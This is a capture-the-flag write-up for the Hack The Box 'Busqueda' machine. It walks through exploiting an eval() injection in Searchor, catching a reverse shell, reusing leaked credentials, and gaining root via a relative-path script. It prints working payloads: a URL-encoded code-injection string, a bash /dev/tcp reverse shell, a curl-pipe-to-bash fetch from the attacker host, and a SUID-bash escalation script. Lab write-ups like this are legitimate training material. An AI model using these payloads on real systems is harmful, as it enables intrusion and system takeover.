 ![image](https://user-images.githubusercontent.com/87700008/230741085-ae68684e-fb9c-4a26-a17f-75349dc030eb.png)

https://app.hackthebox.com/machines/537

## Enumeration:

I began by performing a port scan and discovered that ports 22 and 80 were open:
```
sudo rustscan -a 10.10.11.208 -- -sC -sV -vv -oN busqueda_nmap
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan results showed that SSH was running on port 22, and the Apache HTTP server was running on port 80. I also discovered a domain named "searcher.htb" running on port 80 and added it to the **/etc/hosts** file.

Next, I performed vhost and sub-directory enumeration on the domain but found nothing of interest. Upon further browsing, I discovered that the website was a search tool that provided search results from various search engines on the internet.

![image](https://user-images.githubusercontent.com/87700008/230746368-c6b50271-af99-4b23-9e81-10eed4016f30.png)

To test the functionality of the search feature, I used Burp and observed the response changing when I checked for SQL injection in the query parameter

![image](https://user-images.githubusercontent.com/87700008/232015628-820562f5-dd34-4df5-b3d6-2de04aec009d.png)

![image](https://user-images.githubusercontent.com/87700008/232015895-16b1faa9-075f-4ffd-82d0-c1179bde2e8b.png)

I then used SQLMap to further test the search function, but unfortunately, it did not yield any useful results. 😕

![e79d4ab095244c76be0c42e22382f1b8](https://user-images.githubusercontent.com/87700008/232016168-bd516722-122c-49aa-8391-631c841d3932.png)

Upon further investigation of the website, I discovered the Searchor version and source code on Github:

![image](https://user-images.githubusercontent.com/87700008/232016810-09a178cd-a220-4923-abe2-87e27e67fd03.png)

My research led me to discover that Searchor is vulnerable to [Arbitrary code execution](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303) prior to version 2.4.2.

In the Snyk blog, I found the pull request [page](https://github.com/ArjunSharda/Searchor/pull/130) where the vulnerable parameter was mentioned in the code:

![image](https://user-images.githubusercontent.com/87700008/232018873-ed9340f2-6cbf-4868-9855-1f4c45d62747.png)

It's clear from the comments that eval() is vulnerable to code execution:

![image](https://user-images.githubusercontent.com/87700008/232019522-22ddcb28-83cd-4d16-9ab5-32b3504c82a4.png)

I found some hints about using eval() from the HTB official discussion and came across a [blog](https://realpython.com/python-eval-function/) that provided some security controls.

```
https://forum.hackthebox.com/t/official-busqueda-discussion/277515/160

Building payloads is an artisan’s work, start simple, just close your quote, close the eval and comment everything out, it will end up as ')#, 
if you get a response, it is working, and you can do little changes to try different values, like passing one more value, as this ',1)#, 
if you are still getting a response and not a blank value, then you can freely change this “one” by an exec() call and do everything you want from it 
```
From the blog, I learned that we can use something like the following code to execute our payloads:

![image](https://user-images.githubusercontent.com/87700008/232022263-65166537-0f67-41f3-addb-ee4a64a3b6fd.png)
```
eval(complie("code to execute"), "<String>", "exec") 
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Initial Access:

After multiple attempts and failures, I finally discovered a payload that worked in the URL-encoded format for command execution:

```
'%2beval(compile("import+os\nos.system('id')+",'<String>','exec'))%2b'
```

![image](https://user-images.githubusercontent.com/87700008/232024663-9c834a9b-990e-431e-adda-90f928c4022f.png)

For the reverse shell, I tried multiple payloads, but none of them worked perfectly. Then, I followed another process where I hosted a text file containing a bash reverse shell:

```
bash -i >& /dev/tcp/10.10.X.X/1331 0>&1
```

After the server downloaded this text file, it executed the shell script from the server end using bash.

I used this final payload, which I referenced from another user's [blog](https://blog.csdn.net/qq_58869808/article/details/130050438) :

```
http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl 10.10.14.41/1337.txt | bash ")','a','single'))%2b'
```

And I successfully gained a reverse shell (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/232027067-ca80fa0b-e7a1-4474-9f2e-59c168cbc00b.png)

In the '/var/www/app/.git' folder, I found a config file with Cody's credentials, along with the Gitea domain running on searchor.htb:

![image](https://user-images.githubusercontent.com/87700008/232027831-ca0b94df-ec46-423d-98fd-0ab06b51b520.png)

I added the domain 'gitea.searcher.htb' to the host file and loaded the website, where I found a login page. I was able to log in using Cody's credentials.

![image](https://user-images.githubusercontent.com/87700008/232131761-d01b7b76-b5af-4552-a7c6-584203984425.png)

In Gitea, I only found 'app.py' files in all of the commits, but I didn't find anything helpful.

I tried the SSH credentials with Cody's username but didn't succeed. After further enumeration, I tried the same credential with 'svc' because it's the same user with whom we have the remote shell.

Finally, I logged in via SSH using the 'svc' account, which gave me the user flag.(pwn3d!🙂)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privelege Escalation:

To start enumerating for root access, I first checked the sudo permissions and discovered that I could run the **system-checkup.py** script with root privileges using the following command:
```
/usr/bin/python3 /opt/scripts/system-checkup.py *
```

After executing the command, I received the following output that displayed the docker processes and allowed me to inspect them:

![image](https://user-images.githubusercontent.com/87700008/232138956-c036b82f-519f-41bb-bae9-6bc632468042.png)

I found two running docker processes, namely **gitea** and **mysql_db**.

![image](https://user-images.githubusercontent.com/87700008/232139320-7e50cf9f-4bf7-47e7-b42d-d955df02abfb.png)

I inspected the content of **mysql_db** and obtained root credentials related to Gitea by executing the following command:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
```

![image](https://user-images.githubusercontent.com/87700008/232139819-2ea4ab0d-7f37-4b0a-bfaf-27239b904cfa.png)

Since I had already logged in to Gitea using Cody's credentials, I knew that there was an **administrator** user account. So, I logged in to his account with the credentials obtained from Gitea:

![image](https://user-images.githubusercontent.com/87700008/232140412-9bf68ab8-b654-4e69-b5f1-cda86f52c032.png)

Upon logging in, I found the **system-checkup.py** file in his repository:

![image](https://user-images.githubusercontent.com/87700008/232140739-310c7e52-d8ef-4987-a719-64cb2408df33.png)

By checking the script, I observed that if we used the **full-checkup** argument, it would run the script **/full-checkup.sh**.

![image](https://user-images.githubusercontent.com/87700008/232141411-f86158dd-caa1-4f47-a0cf-8ef55bf61b49.png)

I attempted to run the script with the **full-checkup** argument, but it did not work, possibly due to a missing script.

As I discovered in the **system-checkup.py** script, there was no absolute path to run **full-checkup.sh**. Therefore, I created my own malicious script and added the following command to it:
```
#!/bin/bash
chmod +s /bin/bash
```

![image](https://user-images.githubusercontent.com/87700008/232143172-ccc54e75-c7fb-4148-866e-0a28168e7931.png)

Next, I executed the **system-checkup** script again, and it granted me root bash access. With this, I was able to obtain the root flag (pwn3d!🙂).

![image](https://user-images.githubusercontent.com/87700008/232143461-4201f7f2-a19c-4832-85ea-0988b7bfa426.png)

